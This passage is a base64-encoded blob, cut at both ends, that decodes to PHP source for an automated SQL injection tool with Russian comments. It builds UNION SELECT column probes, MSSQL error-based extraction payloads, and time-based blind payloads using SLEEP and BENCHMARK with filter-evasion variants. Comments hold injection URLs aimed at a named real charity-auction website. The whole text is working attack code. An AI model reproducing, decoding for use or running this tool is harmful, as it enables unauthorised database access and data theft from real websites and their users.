NFTEVDVCsg0LzQtdGC0L7QtAoJCQkKCQkJLy8kdGhpcy0+ZCgkcXVlcnllcywnJHF1ZXJ5ZXMnKTsKCQkJCgkJCWZvcmVhY2ggKCRxdWVyeWVzIGFzICR2YWx1ZSkvL9CyICR2YWx1ZSBhcnJheSgnMTExMTExMTExMTExMStVTklPTitTRUxFQ1QrJywnKy0tKycpLCAKCQkJewoJCQkJCgkJCQkkcmVzdWx0ID0gJHRoaXMtPmdldFNwb3NvYl9tc3NxbCgkdmFsdWUpOwkKCQkJCQkKCQkJCQoJCQkJaWYoJHJlc3VsdCE9PWZhbHNlKQoJCQkJewoJCQkJCgkJCQkJJHRoaXMtPm1ldGhvZCA9ICRtZXRob2Q7CgoJCQkJCSR0aGlzLT5zcG9zb2IgPSAkc3BvczsvLyDQv9C+0LvRg9GH0LDQtdGC0YHRjyDRgtGD0YIg0LLRgdC10LPQtNCwINC/0LXRgNCy0YvQvCDQsdGD0LTQtdGCCgkJCQkJCgkJCQkJcmV0dXJuIHRydWU7CQkJCQoJCQkKCQkJCX0KCQkJCgkJCQkkbWV0aG9kKys7CgkJCQkvL2V4aXQ7CgkJCX0KCQkJCgkJCSRzcG9zKys7CgkJfQoJCQoJCQkKCQkJLy8kdGhpcy0+bXlzcWxHZXRWZXJzaW9uKCk7CgkJCS8vJHRoaXMtPmQoJHRoaXMtPnZlcnNpb24sJyR0aGlzLT52ZXJzaW9uJyk7CgkJCS8vZXhpdDsKCgkJcmV0dXJuIGZhbHNlOwoJCQoJCQoJfQoJCglmdW5jdGlvbiBnZXRTcG9zb2JfbXNzcWwoJHF1ZXJ5X3F1ZXJ5KXsvLyDRgdC+0LfQtNCw0L3QuNC1IHVybCDRgSDQutC+0LvQvtC90LrQsNC8INC4INC/0L7QuNGB0Log0L3Rg9C20L3Ri9GFINCyINC+0YLQstC10YLQtSAKCQoJLy8vLy/QlNCe0KfQldCg0J3Qr9CvINCk0KPQndCa0KbQmNCvINC00LvRjyDQvNC10YLQvtC00L7Qsi8vLy8vLy8KCQkKCQoJCQoJCQoJCQkJJHRoaXMtPmQoJHF1ZXJ5X3F1ZXJ5LCckTVNTUUxfcXVlcnknKTsKCQkJCQoJCQkJZm9yICgkaT0xOyRpPD0kdGhpcy0+Y29sdW1uX2xpbWl0OyRpKyspLy/Qu9C40LzQuNGCIDI1INC/0L4g0LTQtdGE0L7Qu9GC0YMKCQkJCXsKCQkJCQoJCQkJCSRjb2wgPSAxOwoJCQkJCSRxdWVyeTIgPSAkcXVlcnlfcXVlcnlbMF07CgkJCQkJCgkJCQkJd2hpbGUgKCRjb2w8PSRpKQoJCQkJCXsKCQkJCQkJCgkJCQkJCQoJCQkJCQkkaW54ID0gJHRoaXMtPnN0cnRvaGV4KCcteCcuJGNvbC4nLVEtJyk7CgkJCQkJCQoJCQkJCQkKCQkJCQkJaWYoJGNvbD09MSl7CgkJCQkJCQkkcXVlcnkyIC49ICJjQXNUKHskaW54fSBhcyBjaGFyKSI7CgkJCQkJCX1lbHNlewoJCQkJCQkJJHF1ZXJ5MiAuPSAiLC8qKi9jQXNUKHskaW54fSBhcyBjaGFyKSI7CgkJCQkJCX0KCQkJCQkJCQoJCQkJCQkkY29sKys7CgkJCQkJfQoKCQkJCQlpZigkcXVlcnlfcXVlcnlbMV0gPT0nJykKCQkJCQl7CgkJCQkJCSRjb2x1bW4yWyRpXSA9ICR0aGlzLT51cmwuJHF1ZXJ5MjsKCQkJCQl9ZWxzZXsKCQkJCQkJJGNvbHVtbjJbJGldID0gJHRoaXMtPnVybC4kcXVlcnkyLiRxdWVyeV9xdWVyeVsxXTsKCQkJCQl9CgkJCQkKCQkJCQkKCQkJCQkJCQkJCgkJCQl9CgkJCQkKCQkJCQoJCQkKCQkJCWlmKCR0aGlzLT5kZWJ1Zz09dHJ1ZSl7JHRoaXMtPmQoJGNvbHVtbjIsJyRjb2x1bW4yJyk7Zmx1c2goKTt9CgkJCQoJCQkJCgkJCQkvL2V4aXQ7CgkJCQkkaT0xOwoJCQkJCgkJCQlmb3JlYWNoICgkY29sdW1uMiBhcyAka2V5PT4kdmFsdWUpCgkJCQl7CgkJCQkJCgkJCQkJJHRoaXMtPmZvcm1fc2V0Wydmb3JtX3Bvc3RfcXVlcnknXSA9ICR2YWx1ZTsKCQkJCQkKCQkJCQkkZmlsZSA9ICR0aGlzLT5nZXRDb250ZW50cygkdmFsdWUpOwoKCQkJCQkKCQkJCQkvL2V4aXQ7CgkJCQkJaWYoc3Ryc3RyKCRmaWxlLCAnLVEtJykpCgkJCQkJewoJCQkJCQlpZigkdGhpcy0+ZGVidWc9PXRydWUpeyR0aGlzLT5kKCRrZXksJyR2YWx1ZScpO30KCQkJCQkJCgkJCQkJCSRjb2x1bW5aID0gJGtleTsKCQkJCQkJCgkJCQkJCQoJCQkJCQlicmVhazsKCQkJCQkJCgkJCQkJfQoJCQkJCQoJCQkJCSRpKys7CgkJCQkJLy9pZigkaT09MTApe2V4aXQ7fQoJCQkJCQoJCQkJfQoJCQkJCgkJCQoJCQkKCQkJCWlmKGlzc2V0KCRjb2x1bW5aKSkKCQkJCXsJCgoJCQkJCSR0aGlzLT5kKCRjb2x1bW5aLCckY29sdW1uWiEhISEhISEhISEhISEhJyk7CgkJCQkKCQkJCQlwcmVnX21hdGNoX2FsbCgnfi14KC4qPyktUS1+JywkZmlsZSwkYXJyKTsKCQkJCQkKCQkJCQkkdGhpcy0+Y29sdW1uID0gJGNvbHVtblo7CgkJCQkJJHRoaXMtPndvcmsgICA9ICRhcnJbMV07CgkJCQkJCQoJCQkJCXJldHVybiBhcnJheSgkY29sdW1uWiwkYXJyWzFdKTsKCQkJCX1lbHNlewoJCQkJCXJldHVybiBGQUxTRTsKCQkJCX0KCQkKCX0KCQoJIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKCQoJZnVuY3Rpb24gbXNzcWxPcmRlckVycm9yKCl7Ly/Rh9C10YDQtdC3INC+0YjQuNCx0LrQuCDRgyBtc3NxbAoJCgkKCQoJCgkJJGt1MSA9ICR0aGlzLT5jaGFyY2hlcl9tc3NxbCgnW1hdJyk7CgkJJGt1MiA9ICR0aGlzLT5jaGFyY2hlcl9tc3NxbCgnW1hYXScpOwoKCQkKCQkkemFwcl9tc3NxbCA9ImRiX25hbWUoKSI7CgkJJHphcHJfbXNzcWwgPSRrdTEuJysnLiR6YXByX21zc3FsLicrJy4ka3UyOwoJCQoJCgkJJHRoaXMtPmQoJGt1MSwnJGt1MScpOwoJCSR0aGlzLT5kKCRrdTIsJyRrdTInKTsKCQkkdGhpcy0+ZCgkemFwcl9tc3NxbCwnJHphcHJfbXNzcWwnKTsKCQoJCQoJCQkKCQkKCQkkc3RyaW5nWycnXSAgPSAiJyBvciAxPWNvbnZlcnQoaW50LCR6YXByX21zc3FsIENPTExBVEUgU1FMX0xhdGluMV9HZW5lcmFsX0NwMTI1NF9DU19BUykgYW5kICcxJz0nMSI7CgkJLy8kc3RyaW5nWycnXSAgPSAiJyBvciAxPWNPblZlUnQoaW50LCgvKiovY0FzVCgkemFwcl9tc3NxbCBhcyBjaGFyKSkpIGFuZCAnMSc9JzEiOwoJCS8vJHN0cmluZ1snJ10gID0gIicgb3IgMT1jT25WZVJ0KGludCwvKiovY0FzVCgkemFwcl9tc3NxbCBhcyBjaGFyKSkgYW5kICcxJz0nMSI7CgkJLy8kc3RyaW5nWycnXSAgPSAiJyBhbmQgMT1jb252ZXJ0KGludCwkemFwcl9tc3NxbCkgYW5kICcxJz0nMSI7CgkJLy8kc3RyaW5nWycnXSAgPSAiJyBvciAxPWNPblZlUnQoaW50LCR6YXByX21zc3FsKSBhbmQgJzEnPScxIjsKCQkvLyRzdHJpbmdbJyddICA9ICIgYW5kIDE9Y29udmVydChpbnQsJHphcHJfbXNzcWwpIGFuZCAnMSc9JzEiOwoJCS8vJHN0cmluZ1snJ10gID0gIicgYW5kIDE9Y29udmVydChpbnQsJHphcHJfbXNzcWwpIjsKCQoJCSRzcCA9IDA7CgkJCgkJCi8vaHR0cDovL2FzbWUtcGQuYmlkZGluZzRjaGFyaXR5LmNvbS9pdGVtcy5hc3A/Q0lEPTYJCQovL2h0dHA6Ly9hc21lLXBkLmJpZGRpbmc0Y2hhcml0eS5jb20vaXRlbXMuYXNwP0NJRD02JyBvciAxPVt0XSBhbmQgJzEnPScxCgkJCgkJCi8vaHR0cDovL2FzbWUtcGQuYmlkZGluZzRjaGFyaXR5LmNvbS9pdGVtcy5hc3A/Q0lEPTYlMjclMjBvciUyMDElM0Rjb252ZXJ0JTI4aW50JTJDZGJfbmFtZSUyOCUyOSUyMENPTExBVEUlMjBTUUxfTGF0aW4xX0dlbmVyYWxfQ3AxMjU0X0NTX0FTJTI5JTIwYW5kJTIwJTI3MSUyNyUzRCUyNzEKLy9odHRwOi8vYXNtZS1wZC5iaWRkaW5nNGNoYXJpdHkuY29tL2l0ZW1zLmFzcD9DSUQ9Nicgb3IgMT1jb252ZXJ0KGludCxkYl9uYW1lKCkgQ09MTEFURSBTUUxfTGF0aW4xX0dlbmVyYWxfQ3AxMjU0X0NTX0FTKSBhbmQgJzEnPScxCQkKLy9odHRwOi8vYXNtZS1wZC5iaWRkaW5nNGNoYXJpdHkuY29tL2l0ZW1zLmFzcD9DSUQ9NiUyNyUyMG9yJTIwMSUzRGNPblZlUnQlMjhpbnQlMkMlMjhkYl9uYW1lJTI4JTI5JTIwJTIwQ09MTEFURSUyMFNRTF9MYXRpbjFfR2VuZXJhbF9DcDEyNTRfQ1NfQVMlMjklMjBhbmQlMjAlMjcxJTI3JTNEJTI3MQoKCgkJCi8vaHR0cDovL2FzbWUtcGQuYmlkZGluZzRjaGFyaXR5LmNvbS9pdGVtcy5hc3A/Q0lEPTYlMjclMjBvciUyMDElM0Rjb252ZXJ0JTI4aW50JTJDZGJfbmFtZSUyOCUyOSUyMENPTExBVEUlMjBTUUxfTGF0aW4xX0dlbmVyYWxfQ3AxMjU0X0NTX0FTJTI5JTIwYW5kJTIwJTI3MSUyNyUzRCUyNzElMDkJCgkJCgkJIAoJCSAgCgkJICAKCQkgIAoJCSAgCgkJICAKCQkgICAKCQkgICAgCgkJCQoJCQkgCgkJZm9yZWFjaCAoJHN0cmluZyBhcyAka2V5PT4gJHZhbCkKCQl7CgkJCQoJCQlpZigkdGhpcy0+dXJsX2VuY29kZT09dHJ1ZSkKCQkJewoJCQkJJHVybCA9ICR0aGlzLT51cmwucmF3dXJsZW5jb2RlKCR2YWwpOwoJCQl9ZWxzZXsKCQkJCSR1cmwgPSAkdGhpcy0+dXJsLiR2YWw7CgkJCX0KCQkJCgkJCgkJCQoJCQkKCQkJLy8kdXJsID0gcmF3dXJsZW5jb2RlKCInIG9yIDE9Y29udmVydChpbnQsZGJfbmFtZSgpIENPTExBVEUgU1FMX0xhdGluMV9HZW5lcmFsX0NwMTI1NF9DU19BUykgYW5kICcxJz0nMSIpOwoJCQkvLyR1cmwgPSAiaHR0cDovL2FzbWUtcGQuYmlkZGluZzRjaGFyaXR5LmNvbS9pdGVtcy5hc3A/Q0lEPTYiLiR1cmw7CgkJCQoJCQkkc3RyMSA9ICR0aGlzLT5nZXRDb250ZW50cygkdXJsKTsKCQkJCgkJCQoJCQkkdGhpcy0+ZCgkdXJsLCd1cmwnKTsKCQkJJHRoaXMtPmQoJHN0cjEsJyRzdHIxJy4kdmFsKTsKCQkJCgkJCQoJCQlpZigkc3RyMSAhPScnKXsKCQkJCgkJCQlwcmVnX21hdGNoKCJ+dmFsdWUgXCcoLiopXCcgdG8gZGF0YSB0eXBlIGludH5pcyIsJHN0cjEsJGFycik7CgkJCQkvLyR0aGlzLT5kKCRhcnIsJyRhcnInKTsKCQkJCgkJCQoJCQkKCQkKCQkJCWlmKHN0cmlzdHIoJGFyclsxXSwgJ21pY3Jvc29mdCcpKXsKCQkJCQkKCQkJCQkkdGhpcy0+ZCgnZ29vZCcpOwoJCQkJCSR0aGlzLT5nZXRfYnlfZXJyb3IgPSAka2V5OwoJCQkJCSR0aGlzLT5zcG9zb2IgPSAkc3A7CgkJCQkJJHRoaXMtPm1ldGhvZCA9IDM7CgkJCQkJcmV0dXJuIFRSVUU7CgkJCQoJCQkJfQoJCQkvLyRzcCsrOwoJCQl9CgkJfQoJCWV4aXQ7CgkJCgkJcmV0dXJuIGZhbHNlOwoJfQoJCgkKCSMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCgkKCWZ1bmN0aW9uIHNxbGkoJHVybCA9ICcnKXsgLy/QtNC70Y8g0LzQtdGC0L7QtNCwIHNsZWVwIFVOSU9OINCx0LXQtyDQvtGI0LjQsdC60LgKCQkKCQkkdGhpcy0+ZCgnc3FsaSBuYWNoYWxvJyk7CgkJCgkJaWYoJHVybCAhPScnKXsKCQkJJHRoaXMtPnVybD0kdXJsOwoJCX1lbHNlewoJCQkkdGhpcy0+dXJsID0gJHRoaXMtPnVybDsKCQl9CgkJCgoJCS8v0L7QsdGJ0LjQtSDQtNCw0L3QvdGL0LUg0LTQu9GPINCy0YHQtdGFCgkJJHRoaXMtPnNldD0kdGhpcy0+cGFyc2VfbGluaygnaHR0cDovLycuJHRoaXMtPnVybCk7CgkJaWYoJHRoaXMtPmh0dHBzKXsKCQkJJHRoaXMtPnNldFsic2NoZW1lIl0gPSAnaHR0cHMnOwoJCX1lbHNlewoJCQkkdGhpcy0+c2V0WyJzY2hlbWUiXSA9ICdodHRwJzsKCQl9CgkJCgkJCgkJJHRoaXMtPnNlYz0zOy8vID49MgoJCSR0aGlzLT5zZXRbJ2Z1bGwnXSA9ICR0aGlzLT5zZXRbJ3NjaGVtZSddLic6Ly8nLiR0aGlzLT5zZXRbJ2hvc3QnXS4kdGhpcy0+c2V0WydwYXRoJ10uJz8nOwoJCSR0aGlzLT5zZXRbJ3NxbGknXSA9IDA7CgkJCgkJJHR0dCA9IHRpbWUoKTsKCQkKCgkJZm9yZWFjaCgkdGhpcy0+c2V0WydxdWVyeSddIGFzICRrZXkgPT4gJHZhbCkKCQl7CgkJCgkJCSRuZXcgPSB0aW1lKCk7CgkJCSRyYXpuID0gJG5ldy0kdHR0OwoJCQkvL9GB0YLQvtC/0LDQtdC8INC/0LXRgNC10LHQvtGAINC10YHQu9C4INGB0LvQuNGI0LrQvtC8INC00L7Qu9Cz0L4g0LjQtNC10YIKCQkJaWYoJHJhem4+JHRoaXMtPnRpbWVfc2xlZXApeyR0aGlzLT5kKCdUSU1FISEhISAgU0xFRVAhIScpO3JldHVybiBmYWxzZTt9CgkJCgkJCgkJCS8v0LTQu9GPINC80LXRgtC+0LTQsCBzbGVlcAoJCQkkdGhpcy0+c2V0WydzbGVlcCddWydmbHQnXVsndHAnXT1mYWxzZTsvL9Ck0LjQu9GM0YLRgNGD0LXRgtGB0Y8g0LvQuCDQstC+0L7QsdGJ0LUg0YfRgtC+INGC0L4/CgkJCSR0aGlzLT5zZXRbJ3NsZWVwJ11bJ2ZsdCddWydxdCddPWZhbHNlOy8v0KTQuNC70YzRgtGA0YPQtdGC0YHRjyDQu9C4INC60LDQstGL0YfQutCwPwoJCQkkdGhpcy0+c2V0WydzbGVlcCddWydmbHQnXVsnc3AnXT1mYWxzZTsvL9Ck0LjQu9GM0YLRgNGD0LXRgtGB0Y8g0LvQuCDQv9GA0L7QsdC10Ls/CgkJCSR0aGlzLT5zZXRbJ3NsZWVwJ11bJ2ZsdCddWydlZCddPWZhbHNlOy8v0KTQuNC70YzRgtGA0YPQtdGC0YHRjyDQu9C4INC60L7QvNC80LXQvdGC0LDRgNC40LkgLyoqLz8KCQkJJHRoaXMtPnNldFsnc2xlZXAnXVsnZmx0J11bJ2FuJ109ZmFsc2U7Ly/QpNC40LvRjNGC0YDRg9C10YLRgdGPINC70Lgg0YHQu9C+0LLQviBBbmQ/CgkJCSR0aGlzLT5zZXRbJ3NsZWVwJ11bJ2ZsdCddWydubCddPWZhbHNlOy8v0J3Rg9C20LXQvSDQu9C4INC90YPQuyDQsdCw0LnRgj8KCQkJJHRoaXMtPnNldFsnc2xlZXAnXVsnZmx0J11bJ3NxJ109ZmFsc2U7Ly/QndGD0LbQtdC90LAg0LvQuCDQutC+0LLRi9GH0LrQsCDQsiDQvdCw0YfQsNC70LU/CgkJCSR0aGlzLT5zZXRbJ3NsZWVwJ11bJ2ZsdCddWydzbCddPWZhbHNlOy8v0JzQvtC20L3QviDQu9C4INC40YHQv9C+0LvRjNC30L7QstCw0YLRjCBTTEVFUAoJCQkKCQkJJHRoaXMtPnNldFsnc2xlZXAnXVsnaGV4J109IGZhbHNlOwoJCQkKCQkJCgkJCS8vYXJyYXkoIjExMTExMTExMTExMTEnK1VOSU9OK1NFTEVDVCsiLCIrYW5kKycwJz0nMCIKCQkJCgkJCWlmKCR0aGlzLT5zbGVlcF9jaGVjazEpOgoJCQkvL9Ca0LvQsNGB0LjRh9C10YHQutC40Lkg0YHQu9GD0YfQsNC5IC0g0LjQvdGM0LXQutGCINCyINGD0YHQu9C+0LLQuNC4IFdIRVJFCgkJCWlmKGlzX251bWVyaWMoJHZhbCkpCgkJCXsKCQkJCSR0aGlzLT5hcnJheV9zcWxbJ2FycmF5X3NsZWVwJ11bMF09JyBBbkQgU0xlZVAoJy4kdGhpcy0+c2VjLicpJzsKCQkJCSR0aGlzLT5hcnJheV9zcWxbJ2FycmF5X3NsZWVwJ11bMV09JyYmU2xFRXAoJy4kdGhpcy0+c2VjLicpJzsgLy8mJlNMRUVQID0gQU5EU0xFRVAKCQkJfQoKCQkJLy/QndC40YfQtdCz0L4g0L3QtSDRhNC40LvRjNGC0YDRg9C10YLRgdGPIEFORCsnK1NMRUVQCQoJCQkkdGhpcy0+YXJyYXlfc3FsWydhcnJheV9zbGVlcCddWzJdPSInIEFuRCBzTGVlcCgiLiR0aGlzLT5zZWMuIikgQU5kICcxIjsKCQkJCgkJCS8v0JXRgdC70Lgg0YTQuNC70YzRgtGA0YPQtdGC0YHRjyBBTkQg0LjQu9C4INC/0YDQvtCx0LXQuyzQutCw0LLRi9GH0LrQsCDQtdGB0YLRjAoJCQkkdGhpcy0+YXJyYXlfc3FsWydhcnJheV9zbGVlcCddWzNdPSInJiZzTEVFcCgiLiR0aGlzLT5zZWMuIikmJicxIjsKCQkJCgkJCS8v0J/Ri9GC0LDQtdC80YHRjyDQvtCx0YDQtdC30LDRgtGMINGE0LjQu9GM0YLRgCDQvdGD0LvQtdCy0YvQvCDQsdCw0LnRgtC+0LwsINC80LEg0L/RgNC+0LrQsNGC0LjRggoJCQkkdGhpcy0+YXJyYXlfc3FsWydhcnJheV9zbGVlcCddWzRdPWNocigwKS4iJ3x8U0xlZVAoIi4kdGhpcy0+c2VjLiIpJiYnMSI7CgoJCQkvL9CQINCy0LTRgNGD0LMg0LLQtdGC0LrQsCDQvNGD0YHQutGD0LvRjyDQvdC40LbQtSDQv9GP0YLQvtC5LCDQt9C90LDRh9C40YIg0LXQsdC10LzRgdGPINGBINCx0LXQvdGH0LzQsNGA0LrQvtC8CgkJCWlmKGlzX251bWVyaWMoJHZhbCkpCgkJCXsKCQkJCSR0aGlzLT5hcnJheV9zcWxbJ2FycmF5X3NsZWVwJ11bNV09JyBBbkQgQmVOQ2hNYVJLKDI5OTk5OTksTUQ1KE5PVygpKSknOwoJCQkJJHRoaXMtPmFycmF5X3NxbFsnYXJyYXlfc2xlZXAnXVs2XT0nJiZCZU5DaE1hUksoMjk5OTk5OSxNRDUoTk9XKCkpKSc7CgkJCX0KCQkJLy/QrdGC0LAg0LLQtdGA0YHQuNGPINC00LvRjyDRgdGC0YDQvtC60L7QstGL0YUg0L/QsNGA0LDQvNC10YLRgNC+0LIKCQkJJHRoaXMtPmFycmF5X3NxbFsnYXJyYXlfc2xlZXAnXVs3XT0iJyBhTkQgQmVOQ2hNYVJLKDI5OTk5OTksTWQ1KE5vVygpKSkgQW5EICcxIjsKCQkJJHRoaXMtPmFycmF5X3NxbFsnYXJyYXlfc2xlZXAnXVs4XT0iJyYmQmVOQ2hNYVJLKDI5OTk5OTksbUQ1KE5PVygpKSkmJicxIjsKCQkJCgkJCSR0aGlzLT5hcnJheV9zcWxbJ2FycmF5X3NsZWVwJ11bMF09IicgQW5EIHNMZWVwKCIuJHRoaXMtPnNlYy4iKSBBTmQgJzAnPScwIjsKCQkJCgkJCS8vKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysvLwoJCQkKCQkJLy/QnNC10YLQvtC0IHNsZWVwCgkJCSR0aGlzLT50bXA9JHRoaXMtPmNyZWF0ZV9nZXQoJGtleSwkdmFsKTsKCQkJJHRoaXMtPnRtcD0kdGhpcy0+Y3JlYXRlX3BhY2tldCgnJywkdGhpcy0+dG1wKTsKCQkJJHRoaXMtPnNjbmQ9JHRoaXMtPnNlbmRfcGFja2V0KCR0aGlzLT50bXAsJ2hlYWRlcicsJ3RpbWUnKTsvL9C+0YDQuNCz0LjQvdCw0LsKCQkJCgkJCS8v0L/QtdGA0LXQsdC40YDQsNC10Lwg0LLRgdC10Lwg0L3QsNGI0Lgg0LfQsNC/0YDQvtGB0Ysg0L/RgNC10LTQstCw0YDQuNGC0LXQu9GM0L3Ri9C1IDgg0YjRgtGD0Log0LfQsNC/0YDQvtGB0L7Qsiwg0LXRgdC70LggMSDQvdCw0YXQvtC00LjQvCDQvdC+0YDQvNCw0LvRjNC90YvQuSzRgtC+INCx0YPQtNC10Lwg0LXQs9C+INC60YDRg9GC0LjRgtGMINC00LDQu9GM0YjQtSAg0Lgg0LjQtyDRhtC40LrQu9CwINCy0YvRhdC+0LTQuNC8CgkJCWZvcmVhY2goJHRoaXMtPmFycmF5X3NxbFsnYXJyYXlfc2xlZXAnXSBhcyAkaSA9PiAkZmYpCgkJCXsKCQkJCgkJCQkkdGhpcy0+dG1wPSR0aGlzLT5jcmVhdGVfZ2V0KCRrZXksJHZhbC4kZmYpOwoJCQkJCgkJCQkkdGhpcy0+dG1wPSR0aGlzLT5jcmVhdGVfcGFja2V0KCcnLCR0aGlzLT50bXApOwoJCQkJCgkJCQkkdGhpcy0+dG1wPSR0aGlzLT5zZW5kX3BhY2tldCgkdGhpcy0+dG1wLCdoZWFkZXInLCd0aW1lJyk7CgkJCQkKCQkJCSR0aGlzLT5kKCR0aGlzLT50bXAsJyR0aGlzLT50bXAgVElNRScpOwoJCQkJCgkJCQkvL3JldHVybiB0cnVlOwoJCQkJCgkJCQkKCQkJCWlmKCRpPDUpCgkJCQl7CgkJCQkKCQkJCQlpZigkdGhpcy0+dG1wID49KCR0aGlzLT5zZWMtMSkpewoJCQkJCQoJCQkJCQkkdGhpcy0+cmV0WydzbGVlcCddWyd0eXBlJ109MTsKCQkJCQkJJHRoaXMtPnJldFsnc2xlZXAnXVsna2V5J109JGtleTsKCQkJCQkJJHRoaXMtPnJldFsnc2xlZXAnXVsndmFsJ109JHZhbDsKCQkJCQkJJHRoaXMtPnJldFsnc2xlZXAnXVsndHAnXT0kaTsKCQkJCQkJJHRoaXMtPnJldFsnc2xlZXAnXVsndGltZSddPSR0aGlzLT50bXA7CgkJCQkJCWJyZWFrOwoJCQkJCX0KCQkJCX1lbHNlCgkJCQl7CgkJCQkJaWYoJHRoaXMtPnRtcC0kdGhpcy0+c2NuZD4xKQoJCQkJCXsKCQkJCQkJJHRoaXMtPnJldFsnc2xlZXAnXVsndHlwZSddPTE7CgkJCQkJCSR0aGlzLT5yZXRbJ3NsZWVwJ11bJ2tleSddPSRrZXk7CgkJCQkJCSR0aGlzLT5yZXRbJ3NsZWVwJ11bJ3ZhbCddPSR2YWw7CgkJCQkJCSR0aGlzLT5yZXRbJ3NsZWVwJ11bJ3RwJ109JGk7CgkJCQkJCSR0aGlzLT5yZXRbJ3NsZWVwJ11bJ3RpbWUnXT0kdGhpcy0+dG1wOwoJCQkJCQlicmVhazsKCQkJCQl9CgkJCQl9CgkJCQkKCQkJfQoJCQkKCQkJLy/Qu9C+0LPQuNGA0L7QstCw0L3QuNC1CgkJCSR0aGlzLT5kKCR0aGlzLT5zY25kLCdzY25kJyk7CgkJCSR0aGlzLT5kKCR0aGlzLT5yZXQsJ3JldCcpOwkKCQkJJHRoaXMtPmQoJHRoaXMtPnNldCwnc2V0Jyk7CgkJCS8vZXhpdDsKCQkJaWYoJHRoaXMtPnJldFsnc2xlZXAnXVsndHlwZSddKSAvL9C/0YDQtdC00LLQsNGA0LjRgtC10LvRjNC90L7QtSDRgtC10YHRgtC40YDQvtCy0LDQvdC40LUg0L/RgNC+0YjRkdC7CgkJCXsKCQkJCWlmKCR0aGlzLT5zbGVlcF9jaGVjazIgIT0gVFJVRSlyZXR1cm4gJ3NsZWVwX21ldG9kJzsKCQkJCQoJCQl9ZWxzZXsKCQkJCXJldHVybiBmYWxzZTsKCQkJfQoJCQkJCgkJCWVuZGlmOy8vc2xlZXBfY2hlY2sxCQoJCQkKCQkJaWYoJHRoaXMtPnNsZWVwX2NoZWNrMik6CgkJCQoJCQlpZigkdGhpcy0+cmV0WydzbGVlcCddWyd0eXBlJ10pIC8v0J7Qv9GA0LXQtNC10LvRj9C10LwsINGH0YLQviDRhNC40LvRjNGC0YDRg9C10YLRgdGPCgkJCXsKCQkJCS8v0J7Qv9GA0LXQtNC10LvQuNGC0Ywg0YTQuNC70YzRgtGA0LDRhtC40Y4g0L3QsCAxLtCa0LDQstGL0YfQutC4IDIuINCf0YDQvtCx0LXQuwoJCQkJaWYoJHRoaXMtPnJldFsnc2xlZXAnXVsndHAnXT09MCkKCQkJCXsgLy9BTkQgU0xFRVAoMykKCQkJCQkkdGhpcy0+c2V0WydzbGVlcCddWydmbHQnXVsnc3EnXT1mYWxzZTsvL9C60L7QstGL0YfQutCwINCyINC90LDRh9Cw0LvQtSDQvdC1INC90YPQttC90LAKCQkJCQkkdGhpcy0+c2V0WydzbGVlcCddWydmbHQnXVsnc2wnXT10cnVlOyAvLytzbGVlcAoKCQkJCQkvL9Ce0L/RgNC10LTQtdC70Y/QtdC8INC90LDQu9C40YfQuNC1INGE0LjQu9GM0YLRgNCw0YbQuNC4INC60YvQstGL0YfQutC4CgkJCQkJJHRoaXMtPnRtcD0kdGhpcy0+c2VuZF9wYWNrZXQoJHRoaXMtPmNyZWF0ZV9wYWNrZXQoJycsJHRoaXMtPmNyZWF0ZV9nZXQoJHRoaXMtPnJldFsnc2xlZXAnXVsna2V5J10sJHRoaXMtPnJldFsnc2xlZXAnXVsndmFsJ10uIiBBbkQgc2xFRVAoJyIuJHRoaXMtPnNlYy4iJykiKSksJ2hlYWRlcicsJ3RpbWUnKTsKCQkJCQkKCQkJCQkvL9C30LDQv9GA0L7RgSDQstGL0L/QvtC70L3Rj9C10YLRgdGPLCDRgtC+0LXRgdGC0Ywg0L3QsNGBINC/0YDQvtC/0YPRgdGC0LjQu9C4INGBINC60LDQstGL0YfQutC+0LkKCQkJCQlpZigkdGhpcy0+dG1wPj0oJHRoaXMtPnNlYy0xKSl7IAoJCQkJCQkvL9C/0YDQvtCy0LXRgNGP0LXQvCDRgtC+0LbQtSDRgSDQutCw0LLRi9GH0LrQvtC5INC90L4g0LIg0LTRgNGD0LPQvtC8INC80LXRgdGC0LUgU0xFRSdQLCDQv9C+0YHRi9C70LDQtdC8INC30LDQstC10LTQviDQvdC1INCy0LXRgNC90YvQuSDQt9Cw0L/RgNC+0YEuINCV0YHQu9C4INGE0LjQu9GM0YLRgNGD0LXRgtGB0Y8g0YLQviDQstGL0L/QvtC70L3QuNGC0YHRjywg0LXRgdC70Lgg0L3QtdGCINGC0L4g0LfQvdCw0YfQuNGCINC60LDQstGL0YfQutCwINC90LUg0YTQuNC70YzRgtGA0YPQtdGC0YHRjwoJCQkJCQkkdGhpcy0+dG1wPSR0aGlzLT5zZW5kX3BhY2tldCgkdGhpcy0+Y3JlYXRlX3BhY2tldCgnJywkdGhpcy0+Y3JlYXRlX2dldCgkdGhpcy0+cmV0WydzbGVlcCddWydrZXknXSwkdGhpcy0+cmV0WydzbGVlcCddWyd2YWwnXS4iIGFuRCBTbGVFRSdQKCIuJHRoaXMtPnNlYy4iKSIpKSwnaGVhZGVyJywndGltZScpOwoJCQkJCQkvL9C10YHQu9C4INC30LDQv9GA0L7RgSDQstGL0L/QvtC70L3QuNGC0YHRjywg0LfQvdCw0YfQuNGCINC30LDRhNC40LvRjNGC0YDQvtCy0LDQu9Cw0YHRjAoJCQkJCQlpZigkdGhpcy0+dG1wPj0oJHRoaXMtPnNlYy0xKSkkdGhpcy0+c2V0WydzbGVlcCddWydmbHQnXVsncXQnXT10cnVlOwoJCQkJCQllbHNlICR0aGlzLT5zZXRbJ3NsZWVwJ11bJ2ZsdCddWydxdCddPWZhbHNlOwoJCQkJCX1lbHNlICR0aGlzLT5zZXRbJ3NsZWVwJ11bJ2ZsdCddWydxdCddPXRydWU7Ly/QvdC1INC/0YDQvtC/0YPRgdGC0LjQu9C4LCDQt9C90LDRh9C40YIg0YTQuNC70YzRgtGA0YPQtdGC0YHRjwoKCQkJCQkvL9Ce0L/RgNC10LTQtdC70Y/QtdC8INC90LDQu9C40YfQuNC1INGE0LjQu9GM0YLRgNCw0YbQuNC4INC00LLQvtC50L3QvtCz0L4g0LrQvtC80LzQtdC90YLQsNGA0LjRjwoJCQkJCSR0aGlzLT50bXA9JHRoaXMtPnNlbmRfcGFja2V0KCR0aGlzLT5jcmVhdGVfcGFja2V0KCcnLCR0aGlzLT5jcmVhdGVfZ2V0KCR0aGlzLT5yZXRbJ3NsZWVwJ11bJ2tleSddLCR0aGlzLT5yZXRbJ3NsZWVwJ11bJ3ZhbCddLicvKiovQU5ELyoqL1NMRUVQKCcuJHRoaXMtPnNlYy4nKScpKSwnaGVhZGVy